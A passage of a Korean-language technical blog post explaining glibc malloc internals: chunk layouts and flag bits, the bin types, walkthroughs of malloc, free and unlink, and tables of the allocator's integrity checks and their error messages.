+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk                                     |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>위 레이아웃에서 프로그램에 반환되는 메모리 주소는 <code>mem</code>이지만, 그 이전에 <code>INTERNAL_SIZE_T * 2</code>크기의 헤더가 존재한다. (<code>INTERNAL_SIZE_T</code>는 내부적으로 <code>size_t</code>의 크기와 동일하게 연산된다.)</p><p><strong>할당 해제된 청크</strong>의 레이아웃은 아래와 같이 나타낼 수 있다.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk                            |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    'head:' |             Size of chunk, in bytes                         |P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Forward pointer to next chunk in <span class="built_in">list</span>             |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Back pointer to previous chunk in <span class="built_in">list</span>            |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Unused space (may be 0 bytes long)                .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    'foot:' |             Size of chunk, in bytes                           |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></p><p>청크가 해제되면 <code>mem</code> 위치에 <code>fd</code>를 설정하고, <code>mem + sizeof(size_t)</code> 위치에 <code>bk</code>를 설정하게 된다.<br>할당 해제된 청크는 이 <code>fd</code>와 <code>bk</code>를 통해 <strong>이중 연결 리스트</strong>로 관리된다.</p><p>또한 청크 헤더의 <code>size</code>위치에 <code>M, P</code> 등의 값이 붙어있는데, 이는 Heap 메모리가 할당될 때 연산 효율을 위해 할당 크기를 <code>sizeof(size_t) * 2</code>(32비트에서 8바이트)로 정렬하기 때문에, <code>size</code> 비트 하위 3비트(1, 2, 4)의 위치에 플래그를 설정하게 된다.<br>청크 플래그는 3가지가 존재하며, 아래와 같다.</p><h3 id="P-PREV-INUSE"><a href="#P-PREV-INUSE" class="headerlink" title="P (PREV_INUSE)"></a>P (PREV_INUSE)</h3><p>이전 청크(연결 리스트의 이전 인덱스가 아닌, 물리적 메모리로 가장 인접한 청크)가 할당 해제된 상태일 때 0, 사용중일 때 1로 설정된다.</p><p><strong>malloc.c:1269</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure></p><h3 id="M-IS-MMAPPED"><a href="#M-IS-MMAPPED" class="headerlink" title="M (IS_MMAPPED)"></a>M (IS_MMAPPED)</h3><p>해당 청크가 <code>mmap()</code> 함수를 통해 할당되었는지 여부를 표시한다.<br>이 플래그가 설정되었을 경우, 다른 두가지의 플래그를 무시한다.</p><p><strong>malloc.c:1276</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()'ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure></p><h3 id="A-NON-MAIN-ARENA"><a href="#A-NON-MAIN-ARENA" class="headerlink" title="A (NON_MAIN_ARENA)"></a>A (NON_MAIN_ARENA)</h3><p>해당 청크가 main arean에 속해있을 경우 0으로 설정된다.<br>쓰레드가 생성될 때 마다 각각의 arena가 할당되며, 해당 arena에서 청크를 관리하게 되는데, 이때 1로 설정된다.</p><p><strong>malloc.c:1283</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for chunk from non-main arena */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure></p><hr><h1 id="3-Management-of-Chunk-amp-Bin"><a href="#3-Management-of-Chunk-amp-Bin" class="headerlink" title="3. Management of Chunk &amp; Bin"></a>3. Management of Chunk &amp; Bin</h1><p>Heap은 할당 해제된 청크들의 효율적인 관리를 위해 <code>bin</code>이라는 이름의 단일/이중 연결 리스트를 사용한다.<br>bin은 할당 해제된 청크의 크기에 따라 크게 4가지로 분류된다.</p><ol><li>Fast bin</li><li>Unsorted bin</li><li>Small bin</li><li>Large bin</li></ol><p>모든 bin은 쓰레드마다 할당되는 <code>arena</code>에 의해 관리되며, <code>arena</code> 구조체는 아래와 같이 정의되어 있다.</p><p><strong>malloc.c:1686</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>위 <code>arena</code>에서 <code>Fast bin</code>은 아래와 같이 선언되어 있다.</p><p><strong>malloc.c:1694</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Fastbins */</span></span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br></pre></td></tr></table></figure></p><p><code>Unsorted bin</code>, <code>Small bin</code>, <code>Large bin</code>은 아래와 같이 선언되어 있다.</p><p><strong>malloc.c:1703</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br></pre></td></tr></table></figure></p><h2 id="3-1-Fast-bin"><a href="#3-1-Fast-bin" class="headerlink" title="3-1. Fast bin"></a>3-1. Fast bin</h2><p><code>16~88 Byte</code>의 크기를 가지는 청크의 경우, <code>Fast bin</code>으로 관리된다.<br><code>Fast bin</code>은 다른 bins와 다르게 단일 연결 리스트로 관리(<code>fd</code> 필드만 사용)되며, 후입선출(LIFO) 방식으로 관리된다.<br><code>Fast bin</code>은 인접한 2개의 청크를 병합하지 않는다. 이로 인해 해제 속도가 빠르지만, 단편화(fragmentation) 가능성이 존재한다.</p><h2 id="3-2-Unsorted-bin"><a href="#3-2-Unsorted-bin" class="headerlink" title="3-2. Unsorted bin"></a>3-2. Unsorted bin</h2><p><code>Small bin</code>과 <code>Large bin</code>에 들어가야 할 크기의 청크가 해제되었을 때, 바로 <code>Small/Large Bin</code>에 들어가는 것이 아닌, <code>Unsorted bin</code>에 저장이 되어 최근 해제한 청크를 빠르게 재사용 가능(캐시 비슷한 역할)하게 만든다.</p><h2 id="3-3-Small-bin"><a href="#3-3-Small-bin" class="headerlink" title="3-3. Small bin"></a>3-3. Small bin</h2><p><code>16~504 Byte</code>의 크기를 가지는 청크의 경우, <code>Small bin</code>으로 관리된다.<br>환형 이중 연결 리스트로 관리(<code>fd</code>, <code>bk</code> 모두 사용)되며, 선입선출(FIFO) 방식으로 관리된다.<br>해제되는 청크의 앞 뒤에 존재하는 해제된 청크와 병합을 진행하기 때문에 <code>Fast bin</code>보다는 느리지만, <code>Large bin</code>보다는 빠른 속도로 처리된다.</p><h2 id="3-4-Large-bin"><a href="#3-4-Large-bin" class="headerlink" title="3-4. Large bin"></a>3-4. Large bin</h2><p>크게 두 부분으로 나뉘는데, 첫번째 Large bin은 <code>512-568</code>바이트 크기의 청크를, 두번째 Large bin은 <code>576-632</code>바이트 크기의 청크를 포함한다.<br>환형 이중 연결 리스트로 관리되며, 사이즈 값에 따라 내림차순으로 정렬된다.<br><code>Small bin</code>과 동일하게 할당 해제되었을 때 <code>Unsorted bin</code> 내에 임시적으로 저장되며, 인접한 할당 해제된 청크에 대해서 병합을 진행한다.</p><h2 id="3-5-Top-chunk"><a href="#3-5-Top-chunk" class="headerlink" title="3-5. Top chunk"></a>3-5. Top chunk</h2><p><code>Arena</code>의 최상단에 존재하는 청크이다.<br>동적 메모리 할당 요청이 들어오게 될 경우, 1차적으로 <code>bins</code>에서 재할당 가능한 청크가 존재하는지 검사하고, 재할당이 불가능하다면 <code>Top chunk</code>에서 요청한 크기만큼을 떼어 반환한다.<br>만약 요청 크기가 <code>Top chunk</code>의 크기보다 크다면 <code>sbrk()</code> 또는 <code>mmap()</code> 호출을 통해 확장하며 <code>PREV_INUSE</code> 플래그가 항상 활성화 되어 있다.</p><h2 id="3-6-Last-remainder-chunk"><a href="#3-6-Last-remainder-chunk" class="headerlink" title="3-6. Last remainder chunk"></a>3-6. Last remainder chunk</h2><p>사용자가 작은 크기의 청크를 할당 요청했으나 <code>Small bin</code>, <code>Unsorted bin</code>에 존재하는 할당 해제된 청크중 동일한 크기의 청크의 재할당이 불가능할 경우 요청 크기보다 큰 청크를 찾아, 요청 크기만큼 떼어 할당 후 반환한다. 이때 요청 크기만큼 떼고 남은 크기의 청크가 <code>Last remainder chunk</code>가 된다.</p><hr><h1 id="4-Core-Functions"><a href="#4-Core-Functions" class="headerlink" title="4. Core Functions"></a>4. Core Functions</h1><p>핵심 함수들은 다음과 같다.</p><h2 id="4-1-void-libc-malloc-size-t-bytes"><a href="#4-1-void-libc-malloc-size-t-bytes" class="headerlink" title="4-1. void * __libc_malloc (size_t bytes)"></a>4-1. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L2901" target="_blank" rel="noopener">void * __libc_malloc (size_t bytes)</a></h2><ol><li><code>__malloc_hook</code>이 설정되어 있다면, <code>__malloc_hook</code> 포인터를 호출한다.</li><li><code>__malloc_hook</code>이 설정되어 있지 않다면, <code>arena_get()</code> 함수 호출을 통해 <code>mstate ar_ptr</code> 포인터를 가져온다.</li><li><code>ar_ptr</code>, <code>bytes</code>를 인자로 <code>_int_malloc()</code>함수를 호출한다.</li><li><ol><li>만약 <code>ar_ptr</code>가 <code>NULL</code>이 아니고, <code>_int_malloc()</code>함수의 반환값이 <code>NULL</code>이라면,<ul><li><code>arena_get_retry()</code> 호출을 통해 다른 Arena Pointer를 <code>ar_ptr</code>에 받아오고,</li><li><code>_int_malloc()</code>함수를 새로운 <code>ar_ptr</code>을 인자로 다시 실행한다.</li></ul></li><li>아니라면,<ul><li>해당 Arena에 대해 <code>mutex_unlock()</code>를 호출한다.</li></ul></li></ol></li><li>최종적으로 <code>_int_malloc()</code>의 반환값을 반환하기 전, 아래 사항들을 체크한다.<ul><li><code>_int_malloc()</code> 반환값(청크)이 <code>NULL</code>인지</li><li>청크가 <code>mmap()</code>을 통해 할당되었는지</li><li>해당 청크의 아레나가 <code>2</code>에서 찾은 청크인지</li></ul></li><li><code>5</code>의 내용 중 하나라도 True인 경우, 청크의 포인터를 반환한다.</li></ol><h2 id="4-2-static-void-int-malloc-mstate-av-size-t-bytes"><a href="#4-2-static-void-int-malloc-mstate-av-size-t-bytes" class="headerlink" title="4-2. static void * _int_malloc (mstate av, size_t bytes)"></a>4-2. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L3318" target="_blank" rel="noopener">static void * _int_malloc (mstate av, size_t bytes)</a></h2><ol><li>요청 크기가 범위를 벗어난 값인지 체크 후, <code>size</code>값을 정렬<sup><a href="#fn_size_alignment" id="reffn_size_alignment">size_alignment</a></sup>한다.</li><li><code>av</code>의 값이 NULL인지 체크한다.</li><li>사용 가능한 <code>Arena</code>가 존재하지 않을 경우(<code>av</code>==NULL), <code>sysmalloc()</code>을 통해 <code>mmap()</code>을 호출한다. 만약 반환 값이 존재한다면, <code>alloc_perturb()</code>를 호출한 후 포인터 값을 반환한다.</li><li><ol><li>만약 요청 크기가 <code>Fast bin</code> 범위 안이라면,</li><li>요청 크기와 동일한 크기의 <code>Fast bin</code> index를 받아 첫번째 청크를 <code>victim</code>으로 가져온다.</li><li>만약 <code>victim</code>이 NULL이라면, (2)로 넘어간다. (<code>Small bin</code> 탐색)</li><li>만약 NULL이 아니라면, <code>victim</code>의 사이즈가 해당 <code>Fast bin</code>의 사이즈가 맞는지 체크한다.<ul><li>만약 사이즈가 다르다면, <code>malloc(): memory corruption (fast)</code>를 출력하고, <code>malloc_printerr()</code>를 호출한다.</li><li>만약 사이즈가 동일하다면, 해당 청크의 메모리 포인터를 가져온 후 <code>alloc_perturb()</code>를 호출한 뒤 메모리 포인터를 반환한다.</li></ul></li></ol></li><li><ol><li>만약 요청 크기가 <code>Small bin</code> 범위 안이라면,</li><li>요청 크기와 동일한 크기의 <code>Small bin</code> index를 받아 청크를 <code>victim</code>으로 가져온다.</li><li>만약 <code>victim</code>이 <code>0</code>이라면, <code>malloc_consolidate()</code>를 호출한다.</li><li>아니라면, <code>victim-&gt;bk-&gt;fd != victim</code> 연산을 통해 <code>victim</code> 청크의 <code>fd</code>와 <code>bk</code>가 신뢰할 수 있는 값인지 체크한다.<ul><li>만약 <code>victim-&gt;bk-&gt;fd != victim</code>이라면, <code>malloc(): smallbin double linked list corrupted</code>를 출력한다.</li></ul></li><li><code>set_inuse_bit_at_offset()</code> 호출을 통해 <code>victim</code> 청크의 뒤에 존재하는 청크의 <code>PREV_INUSE</code> flag를 변경한다.</li><li><code>Small bin</code>의 <code>fd</code> <code>bk</code>를 재설정함으로써 <code>victim</code> 청크를 <code>Small bin</code>에서 제거한다.</li><li>현재 <code>Arena</code>가 <code>main_arena</code>가 아닐 경우, <code>NON_MAIN_ARENA</code> flag를 설정한다.</li><li>해당 청크의 메모리 포인터를 가져온 후 <code>alloc_perturb()</code>를 호출한 뒤 메모리 포인터를 반환한다.</li></ol></li><li>만약 요청 크기가 <code>Large bin</code> 범위라면,<ul><li>현재 <code>Arena</code>에 <code>Fast bin</code> 청크가 존재하는지 확인한 후, 존재한다면 <code>malloc_consolidate()</code>를 호출하여 청크를 병합한다. (<code>Fast bin</code> Chunk로 인한 단편화(fragmentation) 방지)</li></ul></li><li><ol><li><code>Unsorted bin</code>에서 청크를 <code>victim</code>으로 가져온다.<br>2.<code>victim</code>의 크기가 최소 크기(<code>2*SIZE_SZ</code>)보다 작거나 최대 크기(<code>av-&gt;system_mem</code>)보다 큰지 체크한 후, 작거나 크다면 <code>malloc(): memory corruption</code>을 출력한다.</li><li>만약 요청 크기가 <code>Small bin</code> 범위이며(<code>4.2</code>에서 할당이 되었어야 하지만, <code>bin</code>내에 가용 청크가 없어서 할당되지 못한 경우), <code>victim</code>이 <code>Unsorted bin</code> 내의 유일한 청크이며, <code>victim</code>이 <code>last_remainder</code> 청크이며, <code>victim</code>의 크기가 요청 크기보다 클 경우,<ul><li><code>victim</code> 청크를 <strong>할당된 청크</strong>와 <strong>Last remainder</strong>청크로 나눈 후 header,flag 설정 후 반환한다.</li></ul></li><li>위의 4개의 조건이 하나라도 <code>False</code>일 경우, <code>victim</code>을 <code>Unsorted bin</code>에서 제거한다.</li><li>만약 <code>victim</code>의 크기가 요청 크기와 정확하게 일치할 경우,<ul><li><code>PREV_INUSE</code>, <code>NON_MAIN_ARENA</code> 등의 flag를 설정하고 <code>alloc_perturb()</code>를 호출한 뒤 해당 청크를 반환한다.</li></ul></li><li>만약 요청 크기가 <code>Small bin</code> 범위라면,<ul><li>해당 크기의 bin을 가져와 <code>bck</code>로 설정하고, <code>bck-&gt;fd</code>를 <code>fwd</code>로 설정한다.</li></ul></li><li>만약 요청 크기가 <code>Large bin</code> 범위라면,<ul><li><code>size</code> 필드에 flag bit를 붙이고, <code>Large bin</code>을 정렬한다.<ul><li>만약 <code>victim</code>이 마지막 청크(크기가 가장 작은)보다 작다면, 마지막 위치에 삽입한다.</li><li>아니라면, <code>victim size</code> &lt;= <code>chunk size</code>를 찾아 삽입한다. 만약 크기가 같으면 <code>victim</code>은 <code>chunk</code> 뒤에 삽입된다.</li></ul></li></ul></li><li><code>7.1~7</code>의 내용을 최대 10000번 실행한다.</li></ol></li></ol><h2 id="4-3-void-libc-free-void-mem"><a href="#4-3-void-libc-free-void-mem" class="headerlink" title="4-3. void __libc_free (void *mem)"></a>4-3. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L2933" target="_blank" rel="noopener">void __libc_free (void *mem)</a></h2><ol><li>만약, <code>__free_hook</code>이 설정되어 있다면, <code>__free_hook</code>을 호출한다.</li><li><code>mem</code> 값이 NULL인지 체크한다.</li><li>할당 해제하려는 청크가 <code>mmap()</code> 호출을 통해 할당된 청크라면 <code>munmap_chunk()</code>를 통해 할당 해제한다.</li><li>아니라면, 해당 청크에 대한 <code>arena</code>를 가져와 <code>_int_free()</code>를 호출한다.</li></ol><h2 id="4-4-static-void-int-free-mstate-av-mchunkptr-p-int-have-lock"><a href="#4-4-static-void-int-free-mstate-av-mchunkptr-p-int-have-lock" class="headerlink" title="4-4. static void _int_free (mstate av, mchunkptr p, int have_lock)"></a>4-4. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L3840" target="_blank" rel="noopener">static void _int_free (mstate av, mchunkptr p, int have_lock)</a></h2><ol><li><code>p &lt; p + chunksize(p)</code>인지, <code>p</code>가 정렬된 포인터인지 체크한다.<ul><li>만약 아니라면, <code>free(): invalid pointer</code>를 출력한다.</li></ul></li><li><code>chunksize(p) &lt; MINSIZE</code>인지, 크기가 올바르게 정렬되었는지 체크한다.<ul><li>아니라면, <code>free(): invalid size</code>를 출력한다.</li></ul></li><li>해당 청크의 크기가 <code>Fast bin</code> 범위인지 체크한다.<ol><li>해당 청크 다음에 존재하는 청크의 크기가 최소 크기 <code>2*SIZE_SZ</code>보다 작거나, 최대 크기 <code>av-&gt;system_mem</code>보다 크다면 <code>free(): invalid next size (fast)</code>를 출력한다.</li><li>해당 청크에 대해 <code>free_perturb()</code>를 호출한다.</li><li><code>mstate</code>의 <code>FASTCHUNKS_BIT</code>를 설정한다.</li><li>해당 크기에 맞는 <code>Fast bin</code> index를 찾는다.</li><li>해당 <code>Fast bin</code> index의 최상단에 있는 청크가 해제하려는 청크인지 확인한 후, 맞다면 <code>double free or corruption (fasttop)</code>을 출력한다.</li><li>해당 index의 최상단에 있는 청크의 크기와 해제하려는 청크의 크기를 비교 후, 다르다면 <code>invalid fastbin entry (free)</code>를 출력한다.</li><li>해제하려는 청크를 <code>Fast bin</code> 최상단에 넣고, 끝낸다.</li></ol></li><li>만약 해당 청크가 <code>mmap()</code>을 통해 할당된 청크가 아니라면,<ol><li>만약 해당 청크가 <code>top chunk</code>라면, <code>double free or corruption (top)</code>을 출력한다.</li><li>만약 메모리상의 다음 청크가 해당 <code>Arena</code>의 영역을 벗어난다면, <code>double free or corruption (out)</code>을 출력한다.</li><li>만약 메모리상의 다음 청크의 <code>PREV_INUSE</code> flag가 설정되어 있지 않다면, <code>double free or corruption (!prev)</code>를 출력한다.</li><li>만약 다음 청크의 크기가 최소 크기(<code>2*SIZE_SZ</code>)보다 작거나 최대 크기(<code>av-&gt;system_mem</code>)보다 크다면, <code>free(): invalid next size (normal)</code>을 출력한다.</li><li>해당 청크에 대해 <code>free_perturb()</code>를 호출한다.</li><li>만약 해당 청크의 <code>PREV_INUSE</code> flag가 설정되어 있지 않다면, 이전 청크에 대해 <code>unlink</code>를 호출해 병합을 진행한다.</li><li>만약 다음 청크가 <code>top Chunk</code>가 아닐 경우,<ul><li>다음 청크가 사용중이지 않을 경우 <code>unlink</code>를 호출해 병합을 진행한다.</li><li><code>unsorted_chunk-&gt;fd-&gt;bk != unsorted_chunk</code>인지 체크한 후, 같지 않다면 <code>free(): corrupted unsorted chunks</code>를 출력한다.</li><li>청크를 <code>Unsorted bin</code>에 넣는다.<br>8.만약 다음 청크가 <code>Top Chunk</code>라면 병합을 진행한다.</li></ul></li></ol></li><li>만약 해당 청크가 <code>mmap()</code>을 통해 할당된 청크라면, <code>munmap_chunk()</code>을 호출하여 할당 해제한다.</li></ol><h2 id="4-5-unlink-AV-P-BK-FD"><a href="#4-5-unlink-AV-P-BK-FD" class="headerlink" title="4-5. unlink(AV, P, BK, FD)"></a>4-5. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L1414" target="_blank" rel="noopener">unlink(AV, P, BK, FD)</a></h2><ol><li><code>chunk-&gt;fd-&gt;bk != chunk</code>이거나, <code>chunk-&gt;bk-&gt;fd != chunk</code>일 경우, <code>corrupted double-linked list</code>를 출력한다.</li><li><code>chunk-&gt;fd = chunk-&gt;bk</code>, <code>chunk-&gt;bk = chunk-&gt;fd</code>를 수행한다. (이중 연결 리스트에서 해당 청크를 제거한다.)</li><li>청크의 크기가 <code>Small bin</code> 범위가 아니라면, <code>chunk-&gt;fd_nextsize-&gt;bk_nextsize != chunk</code>이거나 <code>chunk-&gt;bk_nextsize-&gt;fd_nextsize != chunk</code>일 경우, <code>corrupted double-linked list (not small)</code>을 출력한다.</li><li><code>chunk-&gt;fd_nextsize</code>, <code>chunk-&gt;bk_nextsize</code>에 대해 위와 동일하게 연결 해제한다.</li></ol><hr><h1 id="5-Error-Checks"><a href="#5-Error-Checks" class="headerlink" title="5. Error Checks"></a>5. Error Checks</h1><h2 id="5-1-checks-in-int-malloc"><a href="#5-1-checks-in-int-malloc" class="headerlink" title="5-1 checks in _int_malloc"></a>5-1 checks in _int_malloc</h2><div class="table-container"><table><thead><tr><th style="text-align:left">Checks</th><th style="text-align:left">Error Message</th></tr></thead><tbody><tr><td style="text-align:left"><code>fastbin_index (chunksize (victim)) != idx</code></td><td style="text-align:left">malloc(): memory corruption (fast)</td></tr><tr><td style="text-align:left"><code>victim-&gt;bk-&gt;fd != victim</code></td><td style="text-align:left">malloc(): smallbin double linked list corrupted</td></tr><tr><td style="text-align:left"><code>victim-&gt;size &lt;= 2 * SIZE_SZ</code> or <code>victim-&gt;size &gt; av-&gt;system_mem</code></td><td style="text-align:left">malloc(): memory corruption</td></tr><tr><td style="text-align:left"><code>unsorted-&gt;fd-&gt;bk != unsorted</code></td><td style="text-align:left">malloc(): corrupted unsorted chunks</td></tr><tr><td style="text-align:left"><code>unsorted-&gt;fd-&gt;bk != unsorted</code>(in best-fit loop)</td><td style="text-align:left">malloc(): corrupted unsorted chunks 2</td></tr></tbody></table></div><hr><h2 id="5-2-checks-in-int-free"><a href="#5-2-checks-in-int-free" class="headerlink" title="5-2 checks in _int_free"></a>5-2 checks in _int_free</h2><div class="table-container"><table><thead><tr><th style="text-align:left">Checks</th><th style="text-align:left">Error Message</th></tr></thead><tbody><tr><td style="text-align:left"><code>(uintptr_t) p &gt; (uintptr_t) -size</code> or <code>misaligned_chunk (p)</code></td><td style="text-align:left">free(): invalid pointer</td></tr><tr><td style="text-align:left"><code>size &lt; MINSIZE</code> or <code>!aligned_OK (size)</code></td><td style="text-align:left">free(): invalid size</td></tr><tr><td style="text-align:left"><code>next-&gt;size &lt;= 2 * SIZE_SZ</code> or <code>next-&gt;size &gt;= av-&gt;system_mem</code></td><td style="text-align:left">free(): invalid next size (fast)</td></tr><tr><td style="text-align:left"><code>top(fastbin) == p</code></td><td style="text-align:left">double free or corruption (fasttop)</td></tr><tr><td style="text-align:left"><code>old_idx != idx</code></td><td style="text-align:left">invalid fastbin entry (free)</td></tr><tr><td style="text-align:left"><code>p == av-&gt;top</code></td><td style="text-align:left">double free or corruption (top)</td></tr><tr><td style="text-align:left"><code>nextchunk &gt; = ((char *) av-&gt;top + chunksize(av-&gt;top))</code></td><td style="text-align:left">double free or corruption (out)</td></tr><tr><td style="text-align:left"><code>!prev_inuse(nextchunk)</code></td><td style="text-align:left">double free or corruption (!prev)</td></tr><tr><td 